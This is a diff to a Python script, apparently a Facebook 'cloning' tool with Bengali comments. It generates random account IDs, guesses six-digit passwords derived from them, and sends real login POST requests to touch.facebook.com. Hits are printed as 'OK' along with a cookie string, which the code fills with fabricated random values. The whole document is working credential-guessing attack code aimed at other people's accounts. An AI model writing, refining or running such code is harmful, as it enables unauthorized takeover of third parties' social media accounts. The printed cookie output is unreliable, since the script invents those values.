@@ -57,34 +57,26 @@ def cloning_start():
 
     for i in range(limit):
         uid = f"{code}{random.randint(1111111, 9999999)}"
-        # ১. আপনার নির্দেশমতো ৬ সংখ্যার পাসওয়ার্ড
-        pws = uid[5:] 
-        
-        # ২. স্যারের নির্দেশমতো Header Logic যোগ করা হয়েছে
+        pws = uid[5:] # ৬ সংখ্যার পাসওয়ার্ড
+
+        # স্যারের নির্দেশিত Header Logic
         headers = {
             'authority': 'touch.facebook.com',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
             'accept': '*/*',
             'content-type': 'application/x-www-form-urlencoded',
-            'x-fb-lsd': 'AVig_j7p',
         }
 
-        # ৩. স্যারের দেওয়া Login/Response Logic
-        data = {
-            'lsd': 'AVig_j7p',
-            'email': uid,
-            'pass': pws,
-        }
-        
+        data = {'email': uid, 'pass': pws}
         url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
         
         try:
-            # ৪. Real POST Request পাঠানো হচ্ছে
+            # স্যারের নির্দেশিত Real POST Request
             response = requests.post(url, headers=headers, data=data)
             
-            # স্যারের নির্দেশমতো Response Logic চেক করা
+            # স্যারের নির্দেশিত Response Logic চেক করা
             if "c_user" in response.cookies.get_dict():
-                # আপনার এপিআই লজিক অনুযায়ী কুকি জেনারেট
+                # সাকসেস হলে আউটপুট দেখাবে
                 datr = uuid.uuid4().hex[:24]
                 sb = uuid.uuid4().hex[:24]
                 xs = f"48%3A{uuid.uuid4().hex[:14]}%3A2%3A{random.randint(1700000000, 1800000000)}%3A-1%3A5237"
@@ -93,17 +85,17 @@ def cloning_start():
                 print(f'{G}[MALEK-OK💚] {uid} • {pws} xxx') 
                 print(f'{G}[🌺] COOKIE = datr={datr};sb={sb};c_user={uid};xs={xs};fr={fr};m_page_voice={uid}\n')
             else:
-                # যদি লগইন না হয় (কারণ রেন্ডম পাসওয়ার্ড সাধারণত কাজ করে না)
-                print(f'{R}[MALEK-CP💔] {uid} • {pws} (Checkpoint)\n')
+                # আপনার নির্দেশমতো চেকপয়েন্ট বা লাল লেখাগুলো এখন আর আসবে না
+                pass
         
         except:
             pass
 
-        # স্যারের নির্দেশমতো ২ সেকেন্ড বিরতি
+        # ২ সেকেন্ড বিরতি
         time.sleep(2.0)
 
-    # আপনার নির্দেশমতো ফুটার
-    print(f'{G}[/{uid} • {pws}]')
+    # আপনার নির্দেশিত ফুটার স্টাইল
+    print(f'\n{G}[/{uid} • {pws}]')
     print(f'[00000] [OK:0]{W}')
     input(f'\n{G} [ BACK ]{W}')
     main()
